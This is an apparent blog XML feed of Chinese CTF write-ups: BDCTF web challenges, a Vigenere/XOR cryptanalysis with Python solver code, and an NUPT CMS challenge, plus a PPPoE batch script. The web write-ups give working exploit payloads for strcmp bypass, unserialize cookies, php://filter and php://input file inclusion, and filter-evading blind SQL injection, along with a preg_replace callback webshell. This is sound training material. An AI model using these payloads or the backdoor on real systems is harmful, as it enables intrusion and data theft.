flag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF 使用了Quoted Printable encode，在线解码 可知隐藏了flag，让其显示即可。BDCTF{Y0u_4Re_5ucCe5SFul} 队友将文件另存为XML，打开也可见flag。 2017/10/30web签到题 更大的数，格式bdctf{xxx}http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080 修改表单长度限制。bdctf{s0m2thing_ju8t_1ik2_thi8} 简单的题 格式flag{xxxx}http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080 if(isset($_POST['password'])) &#123; if (strcmp($_POST['password'], $flag) == 0) die($flag); else echo "密码不正确！";&#125; post一个数组 password[]= 即可。flag{Y0u_4re_G3t_FLAG_452} WEB100-2 提示是?hint，格式是flag{xxxx}http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080 根据提示访问http://127.0.0.1/ctfoj/bdctf.php?hint 得到源码。带上Cookie: BDCTF=s:21:&quot;BDCTF:www.bluedon.com&quot;%3b 即可得到flag{pBXeeZdOkG1QTP1} 。cookie中的分号要url编码一下。 &lt;?php error_reporting(0); $KEY='BDCTF:www.bluedon.com'; include_once("flag.php"); $cookie = $_COOKIE['BDCTF']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === "$KEY") &#123; echo "$flag"; &#125; else &#123; foo 蓝盾管理员 you are not bd-admin，格式bdctf{xxx}http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080 访问view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&amp;user=php://input 同时post the user is bdadmin 得到bd-admin!&lt;br&gt;PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+ ，解码后得到bdctf{Lfi_AnD_More} //index.php&lt;!-- @$user = $_GET["user"]; @$file = $_GET["file"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is bdadmin"))&#123; echo "hello bd-admin!&lt;br&gt;"; include($file); //flag.php &#125;else&#123; echo "you are not bd-admin ! "; &#125; --&gt; 送大礼 格式bdctf{xxx}http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080 访问 http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt 有jsfuck，解开 后内容如下： extract($_GET); if(isset($bdctf)) &#123; $content=trim(file_get_contents($flag)); if($bdctf==$content) &#123; echo'bdctf&#123;**********&#125;'; &#125; else &#123; echo'这不是蓝盾的密码啊'; &#125; &#125; 访问 http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&amp;flag=php://input 同时post foo 得到bdctf{UCCdlsZyVe} 。 火星撞地球 flag{1q2w3e4r}密码就是答案，格式flag{xxxx}http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080 获取当前数据库名member name=admin%27%20and%20(ASCII(MID((database()),6,1)))=114%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前数据库只有一个表 name=admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),1,1)))=49%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前表名为member name=admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),7,1)))&gt;0%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前表有四条记录 name=admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))=52%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 得到列名’id,member_user,member_password,member_name，。。。’ name=admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=&apos;member&apos;),44,1)))&gt;44%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 查询密码字段 burp爆破得到’5416d7cd6ef195a0f7622a9c56b55e84’，即’1q2w3e4r’。 name=admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user=&apos;admin&apos;),1,1)))=53%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 最后flag为flag{1q2w3e4r} 密室杀人案[x] 格式bdctf{xxxx}http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080 bdctf--密室谋杀案这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。 bluedon用户[x] 格式，bdctf{xxxxx}http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080 //index.phpyou are not bluedon ! &lt;!--$user = $_GET["user"];$file = $_GET["file"];$pass = $_GET["pass"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is bluedon"))&#123; echo "hello bluedon!&lt;br&gt;"; include($file); //class.php&#125;else&#123; echo "you are not bluedon ! ";&#125; --&gt; //class.php//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&amp;user=php://inputthe user is bluedon&lt;?phpclass Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return "恭喜get flag"; &#125;&#125;?&gt;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF平台 Vigenere writeup]]></title>
    <url>%2F2017%2F10%2Fnupt-vigenere%2F</url>
    <content type="text"><![CDATA[题目 It is said that Vigenere cipher does not achieve the perfect secrecy actually :-) Tips: 1.The encode pragram is given; 2.Do u no index of coincidence ？ 3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction) encode.cpp code.txt 什么是异或异或（exclusive or）是二元逻辑运算符，符号为 XOR 或 EOR 或 ⊕或 ^ 。对于表达式 a^b 的取值，当且仅当a、b逻辑值不同时为真。具体来说就是四个式子：1^1=0; 0^0=0; 1^0=1; 0^1=1 。另外，异或有一些基本的特性，本题仅用到第七行的特性即可。 a^a=0;a^0=a;a^b=b^a;a^(b^c)=(a^b)^c;a^b^b=a;------------------------------------------如果 cipher = plain ^ key，那么 plain = cipher ^ key简单地证明一下： c = p ^ k --&gt; c ^ k = p ^ k ^ k --&gt; c ^ k = p------------------------------------------一个以字节为单位进行异或的例子： 97^98 --&gt; 01100001 ^ 01100010 = 00000011 -&gt; 3 概念我们知道，英文中的每个字母使用频率是不同的，在够长的一段话里，各个字母的占比大致稳定，并且这个稳定值也已经用巨大的语料库统计出来了，这就是字母频率。这种统计层面的现象，就给我们提供了判断一段文字是否可能有意义的依据，并且这种判断可以通过编程轻松完成。然而，给定两个字母组合，只计算出其中各字母的占比是不够的，想要准确高效地比较两段文字谁更可能具备有意义的语义，我们最好算出一个归一化参数，用以直观表示可能性的大小，这就是文中提到的 correlation ，计算公式也是有的， ，其中n(i)指字母i在一段话的所有字母中所占的比例，f(i)就是已经统计出来的i字母的频率，具体如下所示。 字母频率列表： frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; 解题理解加密题目的加密方式大致等价于这样写： # coding:utf8key = [0xba, 0x1f, 0x91, 0xb2, 0x53, 0xcd, 0x3e] # 长度范围是1-13，当然，我们还不知道key是多少plain = open('ptext.txt').read()cipher = open('ctext.txt', 'w+')c = ''k = 0for p in plain: c += hex(ord(p) ^ key[k])[2:].zfill(2) k = (k + 1) % len(key)cipher.write(c) 程序意思是将明文和密钥逐字节异或，每次异或后的值用两位十六进制表示写入文件，也就是我们见到的code.txt，在这个过程中，密钥是循环使用的。 那么现在情况是这样的，我们知道： 密钥的长度区间为1-13字节 加密方式为逐字节循环异或 加密结果，即密文的完整内容 我们想知道 明文内容 密钥内容 (⊙﹏⊙) 这看起来有点困难。 不过，其实还有两个不言而喻但非常重要的信息 明文的每一个字节都是可见字符。 明文是一段有意义的话。 解密代码主程序先放个主程序，和下面的对照着看。全部代码在文章底部 。 def main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plain 确定密钥的长度和候选字符集明文由可见字符组成。这意味着任何一个使明文出现不可见字符的值都不可能出现在key里。依据此可以取得两个进展。 求出key的每一个字节有哪些候选字符。具体操作：当我们假设某一字节的key的值时，就可以使用前文提到的plain = cipher ^ key 求出这一字节密文对应的明文，如果这个明文是不可见的，那么我们假设的这个值就不可能出现在key的这个字节。因为是循环异或，所以每个字节的key会去加密多个字节的明文，我们就可以如法炮制，大大缩小key的每个字节的候选字符集。 在1的基础上，确定key可能有哪几种长度。具体操作：我们假设key每一种可能的长度，一一去求对应的候选字符集， 如果有一种长度的key在某一字节的候选字符集为空，那么key就不可能是这个长度。 至此，我们可以从无到有求得 key有哪些可能的长度 以及 key在每一种长度下对应的每个字节的候选字符集 。 上代码： def getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值， 密钥字符集为数字列表。 形如&#123; 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] &#125; ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPool 遍历候选字符集，求出对应的字频这虽是个体力活，却也得小心翼翼。 def getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[&#123; 0x11:&#123;'a':2,'b':3&#125;, 0x12:&#123;'e':6&#125; &#125;, &#123; 0x22:&#123;'g':1&#125; &#125;] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqList 根据字频求得密钥明文是一段有意义的话。这意味着它算出来的correlation值一定是所有候选明文中最大的，依照这一点就能挑出密钥每个字节的值，从而得到整个密钥。这也是整个解密过程最核心的一部分。 def calCorrelation(cpool): '''传入字典，形如&#123;'e':2,'p':3&#125; 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relativedef analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r &gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return key 根据密钥解密求出密钥剩下的就好办了。 def vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plain 一些数据可能的密钥长度和对应字符集&#123;7: [[162, 165, 168, 169, 170, 174, 175, 178, 179, 180, 184, 185, 186, 187, 189, 190, 191], [0, 2, 10, 11, 12, 17, 21, 23, 25, 26, 27, 28, 29, 30, 31, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95], [132, 133, 142, 144, 145, 146, 147, 148, 149, 150, 155, 159, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223], [161, 166, 167, 170, 173, 176, 177, 178, 179, 180, 181, 182, 183, 186, 188], [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 68, 70, 72, 76, 78, 80, 81, 82, 83, 84, 86, 87, 90, 93], [128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 195, 196, 200, 201, 202, 204, 205, 206, 207, 208, 210, 213, 216, 217, 223], [33, 39, 43, 44, 52, 55, 57, 58, 59, 60, 61, 62, 63]]&#125; 最后结果[186, 31, 145, 178, 83, 205, 62] Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily.[Finished in 2.2s] 解密代码全文# coding:utf8def getCipher(file='code.txt'): '''从文件中读取十六进制串，返回十六进制数组 ''' c = open(file).read() codeintlist = [] codeintlist.extend( (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2)))) return codeintlistdef getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。 形如&#123; 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] &#125; ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPooldef calCorrelation(cpool): '''传入字典，形如&#123;'e':2,'p':3&#125; 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relativedef analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r &gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return keydef getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[&#123; 0x11:&#123;'a':2,'b':3&#125;, 0x12:&#123;'e':6&#125; &#125;, &#123; 0x22:&#123;'g':1&#125; &#125;] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqListdef vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plaindef main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plainif __name__ == '__main__': main() 题目备份http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp#include &lt;stdio.h&gt;#define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen("ptext.txt", "r"); fpOut = fopen("ctext.txt", "w"); i=0; while (fscanf(fpIn, "%c", &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a "real-world" implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create "production-quality" code =) */ if (ch!='\n') &#123; fprintf(fpOut, "%02X", ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; ----------------------------------------------------------------------------------http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txtF96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 参考链接 https://en.wikipedia.org/wiki/Index_of_coincidence https://en.wikipedia.org/wiki/One-time_pad https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher https://en.wikipedia.org/wiki/Letter_frequency https://www.lijinma.com/blog/2014/05/29/amazing-xor/ http://blog.csdn.net/qq_31344951/article/details/77934717]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF平台综合题2writeup]]></title>
    <url>%2F2017%2F10%2Fnupt-zonghe2%2F</url>
    <content type="text"><![CDATA[非xss题 但是欢迎留言~地址：get the flag 读取源码在页面底部发现一个这样的链接：http://cms.nuptzj.cn/about.php?file=sm.txt ，说明题目提供了读取文件功能，如果使用 file://协议 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。 http://cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename在拿到的文件里搜索 ".php" ，顺藤摸瓜，能找到并读取到的文件有： sm.txt about.php index.php passencode.php say.php antixss.php so.php preview.php antiinject.php ----------------------------- 知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有list.php ,xlcteam.php 关于file://协议 file://协议 (RFC8089 )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。 在谷歌/火狐浏览器的URL框里输入 file:///D:/ 或者在Linux命令行里敲 lynx file:/// 都可以看到效果。 PHP文档 提供的用法如下： /path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\path\to\winfile.ext \smbserver\share\path\to\winfile.ext file:///path/to/file.ext 关于PHP的过滤器(php://filter) php://filter 和 可用的过滤器列表。主要用在数据流内容读取之前做些筛选过滤，可指定过滤器应用在读模式还是写模式，不指定则两者都应用，也可复合使用多个过滤器，使用管道符隔开即可。 对于CTFer典型的用法像是这样： php://filter/read= &lt; filter list to apply to read chain &gt;/resource= &lt; stream to be filtered &gt; php://filter/read=string.toupper|string.rot13/resource=https://findneo.github.io/ php://filter/convert.base64-encode/resource=filename 常用过滤器列表： String Filters string.rot13 string.toupper string.tolower string.strip_tags Conversion Filters convert.base64-encode &amp; convert.base64-decode convert.quoted-printable-encode &amp; convert.quoted-printable-decode Compression Filters Encryption Filters 注入全局搜索 mysql_query ，发现 say.php,so.php,index.php 都存在数据库操作。选择 so.php 下手。 /*so.php*/&lt;?phpif($_SERVER['HTTP_USER_AGENT']!="Xlcteam Browser")&#123;echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'; exit();&#125;$id=$_POST['soid'];include 'config.php';include 'antiinject.php';include 'antixss.php';$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query("SELECT * FROM `message` WHERE display=1 AND id=$id");$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt;---------------------------------------------------------------------------------------/*antiinject.php*/&lt;?phpfunction antiinject($content)&#123;$keyword=array("select","union","and","from",' ',"'",";",'"',"char","or","count","master","name","pass","admin","+","-","order","=");$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], '',$info);&#125;return $info;&#125;?&gt; 关注 3、11、14、15行。 burp抓包，修改 User-Agent 字段即可。 antiinject() 过滤规则是按黑名单依次把关键字删除。 用黑名单里最后一个关键字 = 分隔即可绕过对多字符关键字的过滤。 用 /**/ 代替空格符。 单字符关键字不太会弄，也许可以用各种编码绕过，不过我们暂时未必需要，有空格和这些多字符关键字，再加上不在黑名单里的 &lt;&gt;/() 已经可以开始搞事了。 mysql_real_escape_string() 的功能是对\x00, \n, \r, \, &#39;, &quot; , \x1a(撤销键,ctrl+z) 加反斜杠转义，我们不用这些字符就是了。 15行处将处理过的参数直接拼接到查询语句，因为查询结果有多列，又没有逗号可用，不好用内联注入，于是尝试基于逻辑的注入。数据库结构在 sm.txt 已经给出。 我们想要在数据库执行的查询语句是这样：SELECT * FROM `message` WHERE display=1 AND id=1 and ascii(mid((select userpass from admin)from 1 for 1))&gt;65因为没法用空格，所以实际上是这样：SELECT * FROM `message` WHERE display=1 AND id= 1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))&gt;65希望经过过滤的 id 值为：1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))&gt;65向 so.php post过去的参数应该是：soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/1/**/fo=r/**/1))&gt;65使用burp爆破soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/§1§/**/fo=r/**/1))&gt;§65§使用 Cluster Bomb 模式，第一个payload 为 [1-40] ，第二个为 [31,32,47-57](经过几次尝试发现usepass字段只有[ \d] )得到[49,48,50,32,49,49,55,32,57,57,32,49,48,55,32,49,49,52,32,48,49,55,32,49,49,48,32,49,49,54,32,49,49,55]也就是[102 ,117 ,99 ,107 ,114 ,117 ,110 ,116 ,117]即funckruntu，访问loginxlcteam登陆即可进后台得知有管理员留的后门 xlcteam.php ，于是读一下这个文件 意外看别人的writeup时惊喜的发现原来并没有过滤逗号，这意味着可以一次注出来管理员密码！所以深夜里我是有些激动的。 soid=1/**/an=d/**/0/**/unio=n/**/selec=t/**/null,usernam=e,userpas=s,null/**/fro=m/**/admi=n//当然，在充分掌握数据库结构前需要一些尝试。 使用回调后门回调后门似乎是 phithon 师傅最先这样称呼的，在 创造tips的秘籍——PHP回调后门 里做了具体介绍。 //xlcteam.php&lt;?php$e = $_REQUEST['www'];$arr = array($_POST['wtf'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; //使用菜刀连接即可。 //url : http://cms.nuptzj.cn/xlcteam.php?www=preg_replace //密码: wtf 菜刀连上后拿到所有文件，发现 config.php 里有数据库配置，于是就可以操作整个数据库了。 是的，中午吃的是美味的黄焖鸡 \o/]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行拨号上网]]></title>
    <url>%2F2017%2F10%2Fcmd-surfnet%2F</url>
    <content type="text"><![CDATA[校园网使用PPPoE拨号上网，每次都通过图形化界面通断网络不太方便，希望能一键上网一键下线，于是写了个小脚本。 配置好相关参数后保存为 C:\Windows\System32\surf.bat ，重启命令行即可使用 surf 命令通断网络，常用的话甚至只要 win+r-&gt;enter就可以自由迅速地上线下线啦。把下面第二十行的注释去掉可以在联网同时打开ss，有些缺憾的是还没有实现断网时退出ss。 流程控制参考了Batch Guide by Terry Newton 。 REM 校园网使用PPPoE拨号上网，将文件内容存为 C:\Windows\System32\surf.bat ，可以命令行拨号上网REM 可自行加开ss@echo offset name=net REM 修改net 为拨号连接的名字set phone=13323333333 REM 修改为拨号上网手机号set pass=2333 REM 运营商提供的密码rasdial | findstr 已连接 &gt; nulif errorlevel 1 goto notfoundrem string was foundrasdial %name% /disconnect goto endfind:notfoundrem string was not foundrasdial %name% %phone% %pass%if "%1" neq "" goto :endfindREM start C:\path\to\your\Shadowsocks\Shadowsocks.exe:endfind 2017/10/05 更新代码： 添加第十九行，如果ss已经在运行，只要传入一个参数就不会尝试开启啦。]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
        <tag>code</tag>
        <tag>Batch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客搭建与自定义]]></title>
    <url>%2F2017%2F09%2Fhexo-config%2F</url>
